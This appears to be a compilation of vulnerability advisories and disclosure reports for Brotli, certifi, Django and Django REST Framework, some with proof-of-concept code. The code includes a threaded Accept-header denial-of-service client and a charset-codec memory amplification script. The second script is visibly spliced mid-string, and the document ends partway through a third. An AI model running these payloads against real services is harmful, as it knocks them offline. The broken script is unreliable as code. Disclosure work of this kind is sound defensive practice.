vulns.description: CVE-2026-111497 ("Node2Shell") is an out-of-bounds write (CWE-787) in Google's Brotli decoder (c/dec/decode.c). DecodeBlockTypeAndLength() returns an ambiguous value for an invalid block switch, and the fast decode path discards it (CWE-252, unchecked return value), so a crafted Brotli stream makes the decoder continue on corrupted state and write past the ring buffer. Upstream rates it CVSS 4.0 9.2 and classifies the impact as potential remote code execution.  The vulnerability is in Google's C library, not in Node.js specifically. The PyPI `Brotli` package is Google's CPython binding and compiles the same c/dec/decode.c that has the actual vulnerability. All `Brotli` releases up to and including 1.2.0 ship the vulnerable decoder; 1.2.1 contains the upstream fix (commit 0ed4268a) and differs from 1.2.0 only in that fix plus a version bump.  The decoder is reached whenever untrusted Brotli data is decompressed. With `Brotli` installed, common HTTP clients decode Brotli responses automatically (urllib3/requests, httpx with the brotli extra, aiohttp) and services that accept `Content-Encoding: br` request bodies decode inbound data, so the flaw is reachable from attacker-controlled input.

A buffer overflow vulnerability in the Brotli decoder (c/dec/decode.c) in Google Brotli versions 1.0.3 through 1.2.0 on all platforms allows a remote unauthenticated attacker to corrupt adjacent decoder state memory, disclose sensitive memory contents, cause a denial of service, or potentially execute arbitrary code using a crafted Brotli-compressed stream.  Users need to update any Brotli libraries or binaries between 1.0.3 through 1.2.0 to the latest available version: 1.0.10 or 1.1.1 or 1.2.1.

Certifi versions before 2026.10.18 include the `emSign ECC Root CA - G3` root certificate in their bundled CA store. Eight eMudhra intermediate CA certificates that chain to this root have compromised private keys and the CA has revoked them.   An attacker with one of the compromised keys can issue valid-looking certificates for any hostname. If the attacker is also on-path, they can intercept or modify TLS traffic from clients that trust the certifi bundle. Examples include `requests`, `urllib3` and `pip`, and the Python.org macOS installer.  Certifi 2026.10.18 removed all emSign roots from the bundle. Certifi 2026.10.19 restored the emSign roots that are not affected. Upgrade to 2026.10.19 or later, and rebuild container images that vendor certifi.

An issue was discovered in 6.0 before 6.0.4, 5.2 before 5.2.13, and 4.2 before 4.2.30. `MultiPartParser` allows remote attackers to degrade performance by submitting multipart uploads with `Content-Transfer-Encoding: base64` including excessive whitespace.  Earlier, unsupported Django series (such as 5.0.x, 4.1.x, and 3.2.x) were not evaluated and may also be affected. Django would like to thank Seokchan Yoon for reporting this issue.

An issue was discovered in 6.0 before 6.0.4, 5.2 before 5.2.13, and 4.2 before 4.2.30. ASGI requests with a missing or understated `Content-Length` header could bypass the `DATA_UPLOAD_MAX_MEMORY_SIZE` limit when reading `HttpRequest.body`, allowing remote attackers to load an unbounded request body into memory.  Earlier, unsupported Django series (such as 5.0.x, 4.1.x, and 3.2.x) were not evaluated and may also be affected. Django would like to thank Superior for reporting this issue.

An issue was discovered in 6.0 before 6.0.4, 5.2 before 5.2.13, and 4.2 before 4.2.30. Admin changelist forms using `ModelAdmin.list_editable` incorrectly allowed new instances to be created via forged `POST` data.  Earlier, unsupported Django series (such as 5.0.x, 4.1.x, and 3.2.x) were not evaluated and may also be affected. Django would like to thank Cantina for reporting this issue.

An issue was discovered in 6.0 before 6.0.4, 5.2 before 5.2.13, and 4.2 before 4.2.30. Add permissions on inline model instances were not validated on submission of forged `POST` data in `GenericInlineModelAdmin`.  Earlier, unsupported Django series (such as 5.0.x, 4.1.x, and 3.2.x) were not evaluated and may also be affected. Django would like to thank N05ec@LZU-DSLab for reporting this issue.

An issue was discovered in 6.0 before 6.0.4, 5.2 before 5.2.13, and 4.2 before 4.2.30. `ASGIRequest` allows a remote attacker to spoof headers by exploiting an ambiguous mapping of two header variants (with hyphens or with underscores) to a single version with underscores.  Earlier, unsupported Django series (such as 5.0.x, 4.1.x, and 3.2.x) were not evaluated and may also be affected. Django would like to thank Tarek Nakkouch for reporting this issue.

An issue was discovered in 6.0 before 6.0.5 and 5.2 before 5.2.14. Response headers do not vary on cookies if a session is not modified, but `SESSION_SAVE_EVERY_REQUEST` is `True`. A remote attacker can steal a user's session after that user visits a cached public page. Earlier, unsupported Django series (such as 5.0.x, 4.1.x, and 3.2.x) were not evaluated and may also be affected.  Django thanks Cantina for reporting this issue.

An issue was discovered in 6.0 before 6.0.5 and 5.2 before 5.2.14. `django.middleware.cache.UpdateCacheMiddleware` erroneously caches requests where the `Vary` header contained an asterisk (`'*'`). This can lead to private data being stored and served. Earlier, unsupported Django series (such as 5.0.x, 4.1.x, and 3.2.x) were not evaluated and may also be affected.  Django thanks Ahmad Sadeddin for reporting this issue.

An issue was discovered in 6.0 before 6.0.5 and 5.2 before 5.2.14. ASGI requests with a missing or understated `Content-Length` header can bypass the `FILE_UPLOAD_MAX_MEMORY_SIZE` limit, potentially loading large files into memory and causing service degradation.   As a reminder, Django expects a limit to be configured at the web server level rather than solely relying on `FILE_UPLOAD_MAX_MEMORY_SIZE`. Earlier, unsupported Django series (such as 5.0.x, 4.1.x, and 3.2.x) were not evaluated and may also be affected.  Django thanks Kyle Agronick for reporting this issue.

An issue was discovered in Django 6.0 before 6.0.6 and 5.2 before 5.2.15. `django.http.HttpRequest.get_signed_cookie` in Django uses a non-injective salt derivation (concatenating the cookie name and salt argument), which allows a remote attacker to use a cookie in a context different from the one where it was signed, via distinct `(name, salt)` pairs that produce the same concatenation. Earlier, unsupported Django series (such as 5.0.x, 4.1.x, and 3.2.x) were not evaluated and may also be affected. Django would like to thank Peng Zhou for reporting this issue.

An issue was discovered in Django 5.2 before 5.2.15 and 6.0 before 6.0.6. `django.middleware.cache.UpdateCacheMiddleware` in Django does not add `Authorization` to the `Vary` response header for requests bearing that header without `Cache-Control: public`, which allows remote attackers to read private cached responses via unauthenticated requests to the same URL. Earlier, unsupported Django series (such as 5.0.x, 4.1.x, and 3.2.x) were not evaluated and may also be affected. Django would like to thank Shai Berger for reporting this issue.

An issue was discovered in Django 6.0 before 6.0.6 and 5.2 before 5.2.15. `django.core.mail.backends.smtp.EmailBackend` in Django fails to prevent reuse of a partially-initialized connection after a failed `STARTTLS` handshake when `fail_silently=True`, which allows on-path network attackers to read email content via cleartext interception. Earlier, unsupported Django series (such as 5.0.x, 4.1.x, and 3.2.x) were not evaluated and may also be affected. Django would like to thank Kasper Dupont for reporting this issue.

An issue was discovered in Django 5.2 before 5.2.15 and 6.0 before 6.0.6. `django.utils.cache.has_vary_header()` in Django does not strip leading or trailing whitespace from `Vary` response header values before comparison, which allows remote attackers to read cached responses via requests to URLs whose responses contain whitespace-padded Vary header values. Earlier, unsupported Django series (such as 5.0.x, 4.1.x, and 3.2.x) were not evaluated and may also be affected. Django would like to thank Navid Rezazadeh for reporting this issue.

An issue was discovered in Django 5.2 before 5.2.15 and 6.0 before 6.0.6. `django.middleware.cache.UpdateCacheMiddleware` in Django does not match `Cache-Control` response directives case-insensitively, which allows remote attackers to read responses that were incorrectly cached because their `Cache-Control` directives used uppercase or mixed-case values. Earlier, unsupported Django series (such as 5.0.x, 4.1.x, and 3.2.x) were not evaluated and may also be affected. Django would like to thank Ahmed Badawe for reporting this issue.

An issue was discovered in Django 6.0 before 6.0.7 and 5.2 before 5.2.16. `UpdateCacheMiddleware` and the `cache_page()` decorator cache responses that vary on cookies when the incoming request carries unrelated cookies, which allows remote attackers to read private data from the shared cache. Earlier, unsupported Django series (such as 5.0.x, 4.1.x, and 3.2.x) were not evaluated and may also be affected. Django would like to thank Chris Whyland for reporting this issue.

An issue was discovered in Django 6.0 before 6.0.7 and 5.2 before 5.2.16. `DomainNameValidator` does not prohibit newlines in domain names (unless used via a form field, since `CharField` strips newlines). If an application uses values with newlines in an HTTP response, header injection can occur. Django itself is unaffected because `HttpResponse` prohibits newlines in HTTP headers. Earlier, unsupported Django series (such as 5.0.x, 4.1.x, and 3.2.x) were not evaluated and may also be affected. Django would like to thank Bence Nagy for reporting this issue.

Earlier, unsupported Django series (such as 5.0.x, 4.1.x, and 3.2.x) were not evaluated and may also be affected. Django would like to thank Bence Nagy for reporting this issue.

An issue was discovered in Django 5.2 before 5.2.17 and 6.0 before 6.0.8. GeoDjango's `django.contrib.gis.geos.GEOSGeometry` is subject to a potential denial-of-service when parsing deeply nested `GEOMETRYCOLLECTION` objects supplied as well-known text (WKT), well-known binary (WKB), or hex-encoded WKB, which triggers unbounded recursion and a segmentation fault in the underlying GEOS library. Spatial field lookups and the `django.contrib.gis.forms.GeometryField` form field are also affected. Earlier, unsupported Django series (such as 5.1.x, 5.0.x, and 4.2.x) were not evaluated and may also be affected. Django would like to thank Andrew MacPherson and kimchunbok_ for reporting this issue.

An issue was discovered in Django 5.2 before 5.2.17 and 6.0 before 6.0.8. GeoDjango spatial lookups optimistically parse the right-hand-side value as a raster by passing it to the `django.contrib.gis.gdal.GDALRaster` constructor. Any value used in a spatial lookup against a `GeometryField` or `RasterField` reaches this constructor, including untrusted input, for example a spatial-field filter submitted through the Django admin changelist query string by a staff user with view permission. A `dict`, or a `str` holding its JSON representation, is opened in write mode regardless of the constructor's `write=False` default, allowing a file with an attacker-chosen name and contents to be written through a file-backed GDAL driver. Any other `str` is treated as a datasource, allowing an outbound network request through a GDAL virtual filesystem handler. Writing a file to a location later imported by the application can result in remote code execution. Earlier, unsupported Django series (such as 5.1.x, 5.0.x, and 4.2.x) were not evaluated and may also be affected. Django would like to thank Bence Nagy, localhost-detect, and kimchunbok_ for reporting this issue.

## Summary  While investigating Django REST Framework's request parsing behavior, I identified that DRF's high-level `request.data` parsing appears to bypass Django's configured `DATA_UPLOAD_MAX_MEMORY_SIZE` protection for `application/json` and `application/x-www-form-urlencoded` request bodies.  In the tested configurations, Django correctly raises `RequestDataTooBig` when applications access `request.body` or Django's native `request.POST`, but DRF successfully parses the same oversized payloads through `request.data`.  This behavior appears to occur because DRF passes the underlying `HttpRequest` object directly to parsers, which consume the request stream through Django's lower-level streaming interface rather than the guarded `request.body` path.  I am reporting this privately because I am unsure whether this behavior is considered part of DRF's intended security boundary, but it appears to bypass a documented Django request-size protection for common DRF request parsing paths and may have availability implications.   # What I Verified  I verified the behavior locally using the following combinations:  * Django **6.0.7** + DRF **3.17.1** → **Affected** * Django **6.0.7** + DRF **current upstream main** → **Affected**  For both versions, the observed behavior was:  ``` Django request.body → RequestDataTooBig  Django request.POST (application/x-www-form-urlencoded) → RequestDataTooBig  Django request.read() → Reads the entire oversized request body  DRF request.data → Successfully parses oversized JSON and urlencoded request bodies ```  I also confirmed that:  * `multipart/form-data` remains protected because DRF delegates multipart parsing to Django's multipart parser. * The behavior reproduces on both direct WSGI and ASGI servers without a reverse proxy or external request-size middleware.   # Technical Details  The relevant execution flow is:  ``` APIView  ↓  rest_framework.request.Request  ↓  request.data  ↓  Request._load_data_and_files()  ↓  Request._parse()  ↓  Request._load_stream()  ↓  self._stream = self._request  ↓  JSONParser.parse(...) or FormParser.parse(...)  ↓  stream.read() / json.load(...) ```  The important implementation detail is that DRF assigns the original Django `HttpRequest` object as the parser stream.  Unlike `request.body` and Django's native form parsing, consuming the stream through `HttpRequest.read()` does not trigger Django's `RequestDataTooBig` protection.  As a result, DRF's built-in parsers successfully consume oversized request bodies that Django itself would reject through its higher-level request interfaces.   # Reproduction Steps  ## Environment  Python 3.13  Django 6.0.7  Django REST Framework 3.17.1 (also reproduced on current upstream main)  Configure:  ```python DATA_UPLOAD_MAX_MEMORY_SIZE = 10 ```  Create a simple DRF API view:  ```python from rest_framework.views import APIView from rest_framework.response import Response  class DemoView(APIView):     def post(self, request):         return Response(request.data) ```  Start the application.  Send an oversized JSON request:  ``` POST /demo Content-Type: application/json Content-Length: >10 bytes ```  Example:  ```json {   "value": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA..." } ```  Observed:  ``` HTTP 200  JSON successfully parsed ```  Now compare against:  ```python request.body ```  Observed:  ``` RequestDataTooBig ```  Likewise, compare against:  ```python request.POST ```  using  ``` application/x-www-form-urlencoded ```  Observed:  ``` RequestDataTooBig ```  This demonstrates different enforcement depending on which request API is used.   # Root Cause  Django documents `HttpRequest.read()` as a streaming interface.  DRF exposes `request.data` as the primary high-level request parsing API.  Currently, DRF forwards the raw Django request stream directly to parsers before any request-size validation equivalent to Django's `request.body` path occurs.  Consequently:  * JSONParser * FormParser  fully consume oversized request bodies despite Django's configured request-size limit.   # Security Impact  This does **not** appear to introduce:  * Authentication bypass * Authorization bypass * Remote code execution * Information disclosure * Integrity compromise  However, it may reduce the effectiveness of deployments relying on Django's `DATA_UPLOAD_MAX_MEMORY_SIZE` to limit request-body resource consumption.  Potential consequences include:  * Additional memory allocation during JSON parsing * Additional CPU usage while decoding large JSON payloads * Increased resource consumption when handling oversized request bodies * Reduced effectiveness of Django's configured request-size protection for DRF endpoints using `request.data`  The practical impact depends on deployment configuration, including:  * upstream request-size limits * reverse proxy configuration * authentication * rate limiting * endpoint exposure   # Memory Observations  During local testing I observed successful parsing of oversized request bodies despite the configured limit.  Representative measurements showed significantly increased memory allocation while parsing large JSON and urlencoded payloads.  I intentionally did **not** perform destructive concurrency testing or attempt to exhaust system resources.   # Scope  Confirmed affected:  * application/json * application/x-www-form-urlencoded  Confirmed not affected:  * multipart/form-data   # Suggested Fix Direction  One possible approach would be for DRF to enforce Django's configured `DATA_UPLOAD_MAX_MEMORY_SIZE` before handing the raw request stream to parsers that fully materialize request bodies in memory.  This would preserve Django's configured request-size protection for the common `request.data` API without requiring broader changes to Django's documented streaming interface.   # Versions Tested  Affected:  * Django 6.0.7 + DRF 3.17.1 * Django 6.0.7 + DRF current upstream main  I did not perform a complete historical version bisect.   # Disclosure  I have not publicly disclosed this behavior.  I am submitting it privately in accordance with the project's security policy because I am unsure whether maintainers consider this part of DRF's intended security boundary.  # Note:  **Thank you for taking the time to review this report.**  If you determine that this behavior should be addressed, I would be happy to help investigate further, develop a fix, add regression tests, and submit a patch if you'd find that helpful.  I have experience as a **Python/Django software engineer, security researcher, and open-source contributor**, and I'd be glad to contribute if you think that would be useful.

Summary  AdminRenderer may disclose data that would normally be protected by GET permissions when rendering a 400 Bad Request response for an invalid write request.  If a view allows POST (or another write method) but denies GET, an invalid request rendered through AdminRenderer can invoke the view's GET handler and include data from the GET representation in the generated HTML response.  This behavior appears to be specific to AdminRenderer and does not affect the normal JSON rendering path.   ---  Details  While investigating the AdminRenderer rendering flow, I observed that invalid write requests are rendered by temporarily overriding the request method and invoking the view's GET handler:  ``` with override_method(view, request, "GET") as request:     response = view.get(request, *view.args, **view.kwargs)  data = response.data ```  This execution path differs from a normal GET request.  Under normal request processing, a GET request flows through:  ``` APIView.dispatch()     └── APIView.initial()             └── APIView.check_permissions() ```  However, during AdminRenderer rendering, the renderer directly invokes:  view.get(...)  A view whose permission class explicitly allowed POST but denied GET still executed its GET handler while rendering an invalid POST request through AdminRenderer.  As a result, data intended to be available only through an authorized GET request was included in the generated HTML response.   ---  Proof of Concept  Using a standard ListCreateAPIView.  Permission class:  ``` class ProbePermission(BasePermission):     def has_permission(self, request, view):         return request.method == "POST"  View:  class View(ListCreateAPIView):     renderer_classes = (AdminRenderer, JSONRenderer)     permission_classes = (ProbePermission,)     serializer_class = ProbeSerializer      def get_queryset(self):         return [             {                 "name": "visible",                 "secret": "GET-ONLY-SECRET",             }         ] ```  Expected Behaviour  ``` GET request → 403 Forbidden  Invalid POST request → 400 Bad Request → Response should contain only validation errors. → GET-only data should not be rendered.  ``` Observed Behaviour  ``` GET request → 403 Forbidden  Invalid POST request rendered through AdminRenderer → 400 Bad Request → HTML response contains:  GET-ONLY-SECRET ```  Tthe same behavior is shown using a minimal APIView implementation.  Observed results:  ``` minimal.post_400.handler_calls = [     ("post", "POST"),     ("get", "GET") ]  minimal.post_400.contains_secret = True ```  Generic view reproduction:  ``` generic.direct_get.status = 403 generic.direct_get.contains_secret = False  generic.post_400.status = 400 generic.post_400.contains_secret = True  generic.post_400.permission_calls = [     ("GenericAdminView", "POST"),     ...     ("GenericAdminView", "OPTIONS") ]  generic.post_400.queryset_calls = [     ("GenericAdminView", "GET"),     ... ] ```  These observations indicate that direct GET requests are correctly denied, while the simulated GET used during AdminRenderer rendering can still retrieve the protected representation.   ---  Impact  This issue may result in information disclosure when all of the following conditions are met:  AdminRenderer is enabled.  The client negotiates the HTML renderer (for example using Accept: text/html).  The application permits POST (or another write method).  GET requests are denied by the configured permission class.  The invalid write request returns 400 Bad Request.  The GET representation contains information that the requester would normally not be permitted to access.   This issue does not appear to affect:  JSON rendering  Standard API responses  Successful write requests   The behavior appears limited to the HTML rendering path used by AdminRenderer.   ---  Suggested Fix  Possible approaches include:  Perform equivalent permission checks before executing the simulated GET request.  Avoid invoking view.get() when the corresponding GET request would not be permitted.  Fall back to rendering only serializer/form validation errors instead of retrieving the GET representation.   A regression test could create a permission class that allows POST while denying GET, then verify that an invalid POST rendered with AdminRenderer does not include data from the protected GET representation.   ---  Environment  Repository:  `encode/django-rest-framework`  Branch tested:  `security-audit-drf`  Commit tested:  `cf582fb58e9e5ffcc8ed78a2cb9aaa8f4865666a`

### Summary  DRF's content negotiation parses each Accept token several times per request and never limits the number of tokens or their total size. Each parse ends up in Django's parse_header_parameters, which takes quadratic time when a quoted parameter value is packed with semicolons. On my machine a single GET with a 780KB Accept header made of 96 such tokens kept one gunicorn worker busy for 18.87 seconds (Django 6.1, djangorestframework 3.18.0, gunicorn 26.0.0, Python 3.13, Docker on macOS). The header is syntactically valid, fits inside gunicorn's default header limits, and needs no authentication. Two concurrent requests, which is one per sync worker, made a default two worker deployment stop answering for my whole 40 second test window. It recovered half a second after I stopped sending.   ### Details  #### What happens  get_accept_list() splits the Accept header on commas with no cap on token count or total size, at rest_framework/negotiation.py:96-97.  For every token, select_renderer() calls media_type_matches() once per renderer, and each call builds fresh _MediaType objects for both sides, at rest_framework/negotiation.py:53-56 and rest_framework/utils/mediatypes.py:22-23. `_MediaType.__init__` calls django.utils.http.parse_header_parameters unconditionally, at rest_framework/utils/mediatypes.py:47.  When nothing matches, DRF raises NotAcceptable (406). Rendering that error response also needs a renderer, so finalize_response() runs the entire negotiation a second time through perform_content_negotiation(force=True), at rest_framework/views.py:434-437.  With the default two renderers this comes to about six parses per Accept token per request. I confirmed the count by instrumenting _MediaType with a counter: six per token, three from the normal pass and three from the forced re-negotiation.  The quadratic part is on the Django side. parse_header_parameters splits parameters with _parseparam, which handles quoted values by recounting the quote characters from the start of the string for every candidate separator, the s.count('"', 0, end) calls in django/utils/http.py. A quoted value holding k semicolons costs roughly k rescans over k characters, so a single ~8KB value takes about 31ms per parse here.  Numbers from my runs, measured as utime+stime deltas of the server process:  one token, ~9KB: 230ms server CPU 24 tokens, 216KB: 5.07s on runserver, which has no per field limit 48 tokens, 432KB: 10.08s on runserver 96 tokens, 780KB: 18.87s under gunicorn defaults  Wall time matched CPU time in every run, so this is pure CPU work. RSS stayed flat at 57MB throughout, this is a time attack and not a memory one.  #### A few details that matter for reproducing it:  Django rejects a single media type string longer than 10,000 chars (MAX_HEADER_LENGTH), so each token has to stay just under that. Going over gives you a ValueError and a 500, which is a different and much weaker problem.  gunicorn defaults are limit_request_field_size 8190 and limit_request_fields 100, so the working shape is 96 separate Accept fields with one ~8.1KB token each. That puts the single request ceiling near 19s, below the default 30s worker timeout, so one request alone does not get a stock gunicorn worker killed by the arbiter. It does not need to. Each request pins one sync worker for its full duration, so on two workers, two held connections wedge the service.  order_by_precedence collects tokens into a set, so identical tokens collapse and the cost mostly disappears. Each token needs its own parameter name, x0=, x1=, x2= and so on.  #### Where a fix could go, either of these alone would be enough:  Parse each Accept token once per request and reuse the result in the matching loop and in the 406 re-negotiation.  Put an aggregate budget in get_accept_list(), say 8KB total or 64 tokens, and treat anything past it as not acceptable.  The quadratic behavior itself lives in Django's parser, but DRF is the one calling it six times per token with no cap on how many tokens there are, so both fixes look like DRF changes to me.   ### PoC  Verified end to end on Docker Desktop for macOS (Apple Silicon, 8 cores), python:3.13-slim image, Django 6.1, djangorestframework 3.18.0, gunicorn 26.0.0. Nothing was configured beyond defaults.  Minimal target, any default DRF project works, this is the one I used.  requirements.txt:      django==6.1     djangorestframework==3.18.0     gunicorn==26.0.0  pocproj/settings.py: ```python SECRET_KEY = 'poc'; DEBUG = False; ALLOWED_HOSTS = ['*'] INSTALLED_APPS = ['django.contrib.contenttypes', 'django.contrib.auth', 'rest_framework'] ROOT_URLCONF = 'pocproj.urls'; WSGI_APPLICATION = 'pocproj.wsgi.application' DATABASES = {'default': {'ENGINE': 'django.db.backends.sqlite3', 'NAME': ':memory:'}} USE_TZ = True ```  pocproj/api.py: ```python from rest_framework.views import APIView from rest_framework.response import Response  class Items(APIView):     def get(self, request):         return Response([{'id': 1, 'name': 'ok'}]) ```  pocproj/urls.py: ```python from django.urls import path from .api import Items urlpatterns = [path('items/', Items.as_view())] ```  Start it:      python manage.py migrate --noinput     gunicorn pocproj.wsgi:application --bind 0.0.0.0:8000 --workers 2  Client, stdlib only, run with python3: ```python import http.client, threading, time  TARGET = ('localhost', 8000)  def fields(n=96, semis=8100):     # 8100 semicolons keeps each field under gunicorn's limit_request_field_size     # (8190) and each token under Django's MAX_HEADER_LENGTH (10000). Distinct     # x{i} names stop order_by_precedence from deduplicating the tokens.     return [f'text/x-poc{i}; x{i}="' + ';'*semis + '"' for i in range(n)]  def burn():     c = http.client.HTTPConnection(*TARGET, timeout=120)     c.putrequest('GET', '/items/', skip_accept_encoding=True)     for f in fields():         c.putheader('Accept', f)     c.endheaders()     r = c.getresponse(); r.read(); c.close()     return r.status  t = time.perf_counter() print('single:', burn(), f'{time.perf_counter()-t:.2f}s') # printed: single: 406 18.87s, baseline GET on the same endpoint is 0.03s  stop = False  def loop():     while not stop:         try:             burn()         except Exception:             pass  ts = [threading.Thread(target=loop, daemon=True) for _ in range(2)] for x in ts:     x.start() for _ in range(9):     time.sleep(2)     try:         c = http.client.HTTPConnection(*TARGET, timeout=3)         c.request('GET', '/items/', headers={'Accept': 'application/json'})         r = c.getresponse(); r.read(); c.close()         print('health: 200')     except Exception as e:         print('health: DEAD', type(e).__name__) stop = True  # printed over 40s: health DEAD at t=2, 7, 12, 22, 27, 32, 37, 42, so 8 of 9 # probes hit the 3s timeout, and one 200 slipped through at t=17 while a worker # was between requests. after stop, one more probe timed out while the in-flight # request finished, then 200 in 0.57s. ```  ### Impact  Availability only, no confidentiality or integrity impact. Any endpoint the attacker can reach is affected, public ones with no authentication at all. On a stock gunicorn setup with two sync workers, two held connections are enough to stop the service for as long as the attacker keeps them, and one request alone costs about 19 seconds of one core. Recovery is immediate once the attack stops, there is no lasting damage.  The requests are valid HTTP and get answered with 406, so they show up in access logs, but nothing about them is malformed, so filters that look for bad requests will not catch them. DRF throttling runs before content negotiation and would cut the rate if configured, but the default configuration ships with no throttle classes, and each request that does get through still costs the full 19 seconds.  The negotiation structure, meaning the uncapped token split, the per-renderer re-parsing, and the 406 re-negotiation, has been in place since 2012. The call switched to parse_header_parameters in July 2022 in #8556. I verified the behavior on 3.18.0.

### Summary  An unauthenticated attacker can defeat Django's `DATA_UPLOAD_MAX_MEMORY_SIZE` limit and force a worker process to allocate arbitrary memory, by naming a compression codec in the Content-Type charset parameter. A 108-byte request body produces a 50,331,648-character value inside the view, an amplification factor of 466,033, and grows process peak RSS by about 97 MiB. No application configuration is required beyond DRF's default parser set; the endpoint only has to accept a JSON body.  ### Details  `JSONParser.parse` decodes the request body with the charset the client supplied on the Content-Type header:  ```python # rest_framework/parsers.py encoding = parser_context.get('encoding', settings.DEFAULT_CHARSET) try:     decoded_stream = codecs.getreader(encoding)(stream)     parse_constant = json.strict_constant if self.strict else None     return json.load(decoded_stream, parse_constant=parse_constant) except ValueError as exc:     raise ParseError('JSON parse error - %s' % str(exc)) ```  Of the roughly 455 codec names `codecs.lookup` resolves on CPython 3.14, about 18 are byte transforms instead of character sets: `bz2_codec`, `zlib_codec`, `base64_codec`, `hex_codec`, `quopri_codec`, `uu_codec` and similar. `codecs.getreader` is the only entry point in the `codecs` module that does not consult `CodecInfo._is_text_encoding`, so it accepts all of them. Sending `Content-Type: application/json; charset=bz2_codec` wraps the request stream in a bz2 decompressor before `json.load` reads it.  The ordering is what makes this exploitable. Django charges `DATA_UPLOAD_MAX_MEMORY_SIZE` against the bytes that arrived on the wire: `rest_framework/request.py` hands `JSONParser` an `io.BytesIO(self.body)`, and `HttpRequest.body` is where `_check_data_too_big()` runs. Decompression happens afterwards, inside the parser, where nothing is counting.  This is DRF's defect and not Django's. Django resolves the charset parameter and assigns `request.encoding`, and `codecs.lookup` does resolve byte transforms, but every Django consumer of `request.encoding` goes through the text-codec API and fails closed. Both `bytes.decode('bz2_codec')` and `str(raw, 'bz2_codec')` raise `LookupError: 'bz2_codec' is not a text encoding; use codecs.decode() to handle arbitrary codecs`. DRF is the only caller that hands the request stream to `codecs.getreader`.  `FormParser` (`parsers.py:84`) and `MultiPartParser` (`parsers.py:104-118`) take the same client-named encoding but fail closed instead of amplifying.  The sink was introduced by `9a228116` (PR #5147, 2017-05-24, "Improve memory footprint when reading large JSON requests"), first released in 3.6.4. The final comment on that PR observes the intended memory gain does not hold because `read()` decodes the whole stream, which is the same property that makes this expansion unbounded. No `_is_text_encoding` check has been added since.  A one-line fix at `parsers.py:61-64`:  ```python if not codecs.lookup(encoding)._is_text_encoding:     raise ParseError('Unsupported charset in Content-Type') ```  ### PoC  Save as `poc_charset_amplification.py` and run it. It builds its own payloads, runs each arm in a fresh subprocess (peak RSS is a high-water mark, so measuring several arms in one process reports near-zero growth for every arm after the first), and prints a verdict.  ```python #!/usr/bin/env python """ django-rest-framework: JSONParser applies an attacker-named codec to the request stream, defeating DATA_UPLOAD_MAX_MEMORY_SIZE.  Four arms, each in a fresh subprocess because peak RSS is a high-water mark and measuring several arms in one process reports ~0 growth for every arm after the first.    T   ~108-byte bz2 body, Content-Type: application/json; charset=bz2_codec   C1  48 MiB plaintext,   Content-Type: application/json   (no charset)   C2  the byte-identical T body, charset=utf-8   C3  zlib body, charset=zlib_codec  The claim is T AND C1 AND C2. C1 proves the size limit is live; C2 proves the codec name and not the payload is what produces the expansion.  Requires: django, djangorestframework importable. No arguments, nothing to edit.     python poc_charset_amplification.py Exit status 0 means every arm behaved as described in the advisory. """ import hashlib import json import os import subprocess import sys import tempfile  PAYLOAD_CHARS = 48 * 1024 * 1024 PAYLOAD_DIR = os.path.join(tempfile.gettempdir(), "drf-charset-amp") LIMIT = 65536  ARMS = {     "T": ("bz2.bin", "application/json; charset=bz2_codec"),     "C1": ("plain.bin", "application/json"),     "C2": ("bz2.bin", "application/json; charset=utf-8"),     "C3": ("zlib.bin", "application/json; charset=zlib_codec"), } EXPECTED = {     "T": "HTTP 200, parsed value orders of magnitude larger than the wire bytes",     "C1": "rejected with RequestDataTooBig, view     T and C1 and C2: {'all held' if ok else 'NOT all held'}")     return 0 if ok else 1   if __name__ == "__main__":     sys.exit(main()) ```  Observed output, abbreviated to the summary block:  ``` # payload sizes: {'plain.bin': 50331656, 'bz2.bin': 108, 'zlib.bin': 48941} # DATA_UPLOAD_MAX_MEMORY_SIZE = 65536 # JSON string value under test: 50331648 characters  === summary     T   wire=      108B  status=200  parsed_len=50331648  ratio=466033.8  peak_rss_delta=96.8 MiB  view_ran=True     C1  wire= 50331656B  status=400  parsed_len=None      ratio=None      peak_rss_delta=48.3 MiB  view_ran=False     C2  wire=      108B  status=400  parsed_len=None      ratio=None      peak_rss_delta=0.0 MiB   view_ran=False     C3  wire=    48941B  status=200  parsed_len=50331648  ratio=1028.4    peak_rss_delta=95.2 MiB  view_ran=True      T and C1 and C2: all held ```  C1 establishes that the size limit is live and configured, so the 200 in T is a defeated guard and not an absent one. C1 reports its own RSS growth because the client holds the 48 MiB body before the limit rejects it, which is client-side cost and never reaches the view. C2 carries most of the weight: its body is byte-identical to T, and only the codec name differs. RSS figures vary by a few MiB between runs.  Repeating all four arms on Django 5.2.17 LTS gave 109 wire bytes to 50,331,648 characters, 461,758x, with C1 and C2 both holding. Both `Client.post()` and `RequestFactory.post()` push the body through `force_bytes(data, encoding=<charset>)` (`django/test/client.py:438-447`), which destroys a compressed payload before the parser sees it.  ### Impact  Unauthenticated denial of service through memory amplification, against any endpoint that accepts a JSON body with the default parser set. Every deployment on 3.6.4 or later is affected, and no application code or configuration choice opts into it. Memory is per-request and released afterwards, which is why this is rated on availability alone rather than as Critical, but the amplification factor means a small number of concurrent requests can exhaust a worker. A few hundred bytes allocates hundreds of megabytes, and nothing in DRF or Django bounds the expanded size.

### Summary  Deleting an authentication token through `TokenProxy` silently deletes nothing. The call raises no exception and reports success, the database row survives, and the token keeps authenticating. Any application, admin integration or operational script that revokes credentials by calling `.delete()` on a `TokenProxy` instance believes it has revoked a token that is still live.  ### Details  `TokenProxy` overrides `pk` to return the user id (`rest_framework/authtoken/models.py:49-63`):  ```python @property def pk(self):     return self.user_id ```  The concrete `Token` model keys on `key`, not on an integer id. `Model.delete()` builds its delete query from `pk`, so it emits:  ```sql DELETE FROM "authtoken_token" WHERE "authtoken_token"."key" IN ('1') ```  That matches a user id against the 40-character key column. Nothing matches, nothing raises, and the call returns `(0, {'authtoken.TokenProxy': 0})`.  DRF already ships two workarounds for this same identity mismatch instead of a fix. In `rest_framework/authtoken/admin.py`, `TokenAdmin.delete_model` re-fetches the concrete row:  ```python def delete_model(self, request, obj):     Token.objects.get(key=obj.key).delete()   # admin.py:30 ```  and `TokenAdmin` sets `actions = None` with the comment "Actions not compatible with mapped IDs" (`admin.py:50-53`). The shipped admin path is therefore safe, and every other caller of `TokenProxy.delete()` is not. Nothing in the API signals the difference.  `TokenProxy` was added by `e2bd3b6a` (PR #7341, "Adjusted token admin to map to user ID"), first released in 3.12.0.  A fix would drop the `pk` override, or give `TokenProxy` a `delete()` that operates on the concrete row, or raise instead of silently reporting zero deletions.  ### PoC  Save as `poc_tokenproxy_revocation.py` and run it.  ```python #!/usr/bin/env 